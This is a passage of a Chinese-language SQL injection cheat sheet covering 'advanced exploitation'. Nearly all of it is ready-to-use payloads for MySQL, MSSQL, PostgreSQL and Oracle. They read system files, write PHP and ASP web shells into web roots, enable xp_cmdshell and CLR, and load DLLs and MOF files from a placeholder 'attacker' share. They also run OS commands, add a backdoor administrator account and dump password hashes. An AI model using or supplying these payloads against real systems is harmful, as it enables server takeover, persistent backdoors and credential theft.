## 六、高级利用场景

### 6.1 文件读写
```sql
-- MySQL读文件（需FILE权限 + secure_file_priv为空）
' UNION SELECT LOAD_FILE('/etc/passwd')--
' UNION SELECT LOAD_FILE(0x2f6574632f706173737764)--  (十六进制路径无引号)

-- MySQL写文件
' UNION SELECT '<?php @eval($_POST[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php'--
' UNION SELECT '<?php @eval($_POST[cmd]);?>' INTO DUMPFILE '/var/www/html/shell.php'--
-- General Log写Shell
'; SET GLOBAL general_log='ON';SET GLOBAL general_log_file='/var/www/html/shell.php';--
'; SELECT '<?php @eval($_POST[cmd]);?>';--
-- Slow Query Log写Shell
'; SET GLOBAL slow_query_log=1;SET GLOBAL slow_query_log_file='/var/www/html/shell.php';--
'; SELECT '<?php @eval($_POST[cmd]);?>' OR SLEEP(11);--

-- MSSQL文件操作（启用xp_cmdshell后）
'; EXEC xp_cmdshell 'echo ^<?php @eval($_POST[cmd]);?^> > C:\\inetpub\\wwwroot\\shell.php'--
-- BULK INSERT读文件
'; CREATE TABLE tt(t varchar(8000));BULK INSERT tt FROM 'c:\\windows\\win.ini';SELECT * FROM tt;DROP TABLE tt--

-- Oracle文件读写（需UTL_FILE/DBA权限）
'; DECLARE f UTL_FILE.FILE_TYPE;BEGIN f:=UTL_FILE.FOPEN('C:\','shell.php','W');UTL_FILE.PUT_LINE(f,'<%execute(request("cmd"))%>');UTL_FILE.FCLOSE(f);END;--
```

### 6.2 命令执行
```sql
-- MSSQL xp_cmdshell
'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;--
'; EXEC xp_cmdshell 'whoami'--
-- 注册表CLR绕过xp_cmdshell禁用
'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'clr enabled',1;RECONFIGURE;--
'; CREATE ASSEMBLY [cmd] FROM '\\attacker\share\cmd.dll' WITH PERMISSION_SET=UNSAFE;--

-- MySQL UDF提权（需FILE权限+plugin目录可写）
'; SELECT load_file('\\attacker\share\udf.dll') INTO DUMPFILE 'C:/Program Files/MySQL/lib/plugin/udf.dll';--
'; CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';SELECT sys_eval('whoami');--

-- PostgreSQL 命令执行
'; CREATE TABLE cmd(out text);COPY cmd FROM PROGRAM 'id';SELECT * FROM cmd;--
'; COPY (SELECT '') TO PROGRAM 'ping attacker.com'--

-- Oracle命令执行（需JAVA/DBA权限）
'; BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'CMD',job_type=>'EXECUTABLE',job_action=>'/bin/sh',number_of_arguments=>2,auto_drop=>FALSE);DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('CMD',1,'-c');DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('CMD',2,'id');DBMS_SCHEDULER.RUN_JOB('CMD');END;--
```

### 6.3 权限提升与横向
```sql
-- MSSQL 提权
'; EXEC sp_addsrvrolemember 'sa','sysadmin'--
'; EXEC master..xp_servicecontrol 'start','schedule'--
'; EXEC master..xp_cmdshell 'net user hacker P@ssw0rd /add && net localgroup administrators hacker /add'--

-- MySQL UDF→MOF提权（老版本）
'; SELECT load_file('\\attacker\mof.mof') INTO DUMPFILE 'c:/windows/system32/wbem/mof/nullevt.mof';--

-- 哈希dump
'; SELECT user,authentication_string FROM mysql.user--
'; SELECT name,master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins--
```

